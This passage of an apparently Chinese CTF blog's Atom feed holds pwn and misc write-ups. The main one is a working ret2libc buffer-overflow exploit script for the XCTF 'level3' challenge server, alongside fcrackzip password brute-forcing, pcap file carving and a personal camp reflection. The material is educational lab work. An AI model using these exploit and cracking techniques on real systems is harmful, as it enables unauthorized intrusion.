class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'Give me the point(1~6): '</span>)</span><br><span class="line">    p.sendline(num[index])</span><br><span class="line">    index=index+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;溢出点&quot;&gt;&lt;a href=&quot;#溢出点&quot; class=&quot;headerlink&quot; title=&quot;溢出点:&quot;&gt;&lt;/a&gt;溢出点:&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>level3</title>
    <link href="http://yoursite.com/2019/08/15/XCTF-PWN/"/>
    <id>http://yoursite.com/2019/08/15/XCTF-PWN/</id>
    <published>2019-08-15T14:34:34.000Z</published>
    <updated>2019-08-20T15:39:20.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者<code>/bin/sh</code>字符串，考察的是libc泄露的基本操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = cyclic(0x100)</span></span><br><span class="line">io = process(<span class="string">'./level3'</span>)</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45330</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048484</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x8c</span>*<span class="string">'a'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">'write:'</span>+hex(write))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>, write)</span><br><span class="line">system = write + obj.dump(<span class="string">"system"</span>) - obj.dump(<span class="string">"write"</span>)      <span class="comment">#system offset</span></span><br><span class="line">bin_sh = write + obj.dump(<span class="string">"str_bin_sh"</span>) - obj.dump(<span class="string">"write"</span>)   <span class="comment">#/bin/sh offset</span></span><br><span class="line">info(<span class="string">'system:'</span>+hex(system))</span><br><span class="line">info(<span class="string">'/bin/sh:'</span>+hex(bin_sh))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x8c</span>*<span class="string">'b'</span>+p32(system)+p32(main_addr)+p32(bin_sh)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>调试技巧:</strong></p><p>在read处按下<code>Tab</code>键找到地址</p><p>断点下在 <code>0x08048482</code> 处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048482                 leave</span><br><span class="line">.text:08048483                 retn</span><br></pre></td></tr></table></figure><p>python里加上调试语句，python脚本运行时会自动打开<code>gdb</code>进行调试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb.attach(io)</span></span><br></pre></td></tr></table></figure><p>但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">io.recvuntil(&apos;Input:\n&apos;)</span><br><span class="line"># pause()</span><br><span class="line">io.sendline(payload1)</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure><p>在填充至返回地址的时候，可以用<code>gdb</code>跟踪到ret指令处，此时查看<code>$esp</code>寄存器的内容，可以检查自己的地址是否填正确。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;level3&quot;&gt;&lt;a href=&quot;#level3&quot; class=&quot;headerlink&quot; title=&quot;level3&quot;&gt;&lt;/a&gt;level3&lt;/h2&gt;&lt;p&gt;漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者&lt;code&gt;/bin/sh&lt;/code&gt;字
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="xctf" scheme="http://yoursite.com/tags/xctf/"/>
    
  </entry>
  
  <entry>
    <title>xman-misc</title>
    <link href="http://yoursite.com/2019/08/12/xman-misc/"/>
    <id>http://yoursite.com/2019/08/12/xman-misc/</id>
    <published>2019-08-12T10:14:10.000Z</published>
    <updated>2019-08-20T15:35:52.042Z</updated>
    
    <content type="html"><![CDATA[<h2 id="cephalopod"><a href="#cephalopod" class="headerlink" title="cephalopod"></a>cephalopod</h2><p>题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://user-images.githubusercontent.com/42031559/62858792-de2a4180-bd2d-11e9-9e1b-de1a14c7cd32.png" alt="ceph1" title>                </div>                <div class="image-caption">ceph1</div>            </figure><p>追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://user-images.githubusercontent.com/42031559/62858798-e71b1300-bd2d-11e9-8ce1-dc3a0862ac22.png" alt="ceph2" title>                </div>                <div class="image-caption">ceph2</div>            </figure><p>linux下使用tcpxtract分离，其中一张图片即为flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap</span><br></pre></td></tr></table></figure><h2 id="Erik-Baleog-and-Olaf"><a href="#Erik-Baleog-and-Olaf" class="headerlink" title="Erik-Baleog-and-Olaf"></a>Erik-Baleog-and-Olaf</h2><p>压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare hint.png stego100.png -compose src diff.png</span><br></pre></td></tr></table></figure><p>hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可</p><h2 id="Miscellaneous-300"><a href="#Miscellaneous-300" class="headerlink" title="Miscellaneous-300"></a>Miscellaneous-300</h2><p>一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys,zipfile</span><br><span class="line">original_file=<span class="string">'12475.zip'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    original_file = zipfile.ZipFile(original_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'zip'</span> <span class="keyword">in</span> original_file.namelist()[<span class="number">0</span>]:</span><br><span class="line">        inner_zipfile = original_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        original_file_password = inner_zipfile[:inner_zipfile.find(<span class="string">'.'</span>)]</span><br><span class="line">        original_file.setpassword(original_file_password)</span><br><span class="line">        original_file.extractall()</span><br><span class="line">        os.remove(original_file.filename)</span><br><span class="line">        original_file = inner_zipfile</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>到最后一层12475.zip无法解压了，这个时候进行爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -l 1-6 -c 'a1' 12475.zip</span><br></pre></td></tr></table></figure><ul><li>-u：使用unzip解压</li><li>-l：后面接长度范围</li><li>-c：后接字符，a为所有小写字母，1是数字[0-9]</li></ul><h2 id="小小的PDF"><a href="#小小的PDF" class="headerlink" title="小小的PDF"></a>小小的PDF</h2><p>打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -i 2333.pdf -o test</span><br></pre></td></tr></table></figure><p>foremost是基于文件头及尾部信息恢复文件的工具。</p><h2 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h2><ul><li><a href="https://chybeta.github.io/2017/08/25/流量包提取文件方法/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/</a></li><li><a href="https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf</a></li><li><a href="https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300" target="_blank" rel="noopener">https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;cephalopod&quot;&gt;&lt;a href=&quot;#cephalopod&quot; class=&quot;headerlink&quot; title=&quot;cephalopod&quot;&gt;&lt;/a&gt;cephalopod&lt;/h2&gt;&lt;p&gt;题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下
      
    
    </summary>
    
    
      <category term="xctf" scheme="http://yoursite.com/tags/xctf/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>XMAN-2019-福州营</title>
    <link href="http://yoursite.com/2019/08/11/xman/"/>
    <id>http://yoursite.com/2019/08/11/xman/</id>
    <published>2019-08-11T09:55:59.000Z</published>
    <updated>2019-08-12T03:06:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该是这样，因为太过符合心中的期待而感觉过于自然，我知道这是因为夏令营把所有爱好安全的人都聚集到一起了，身边都是志同道合的人这是一件很难得的事，在这里学习的9天时间，我感受到和别人的差距。很奇怪，我并没有向学校里绩点比人低那样焦虑，我想的只是我要怎么弥补自己的基础知识，要怎么向大佬请教，要怎么搞懂这道题。大佬们很强，有名校学长带着入门的；有自己摸索刷题999+的，看到有这么多人和我一样真正的在搞这个东西，想到自己玩的这么浮躁，还把理由归于方向以至于这么就都只是菜鸟，不禁觉得惭愧。想要变强除了做题、看书、总结没有别的途径，你不会证明基础知识不够牢固，那就继续学，而不是怀疑和放弃。不过一个做总是避免不了成为井底之蛙，你不知道外面的世界，也不知道自己的水平，更不知道自己学得怎么样，这次出来真的是让我见了市面，也明白了要端正学习态度，不能有畏难情绪，希望自己能在这条路上坚持下去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该
      
    
    </summary>
    
    
  </entry>
  
</feed>
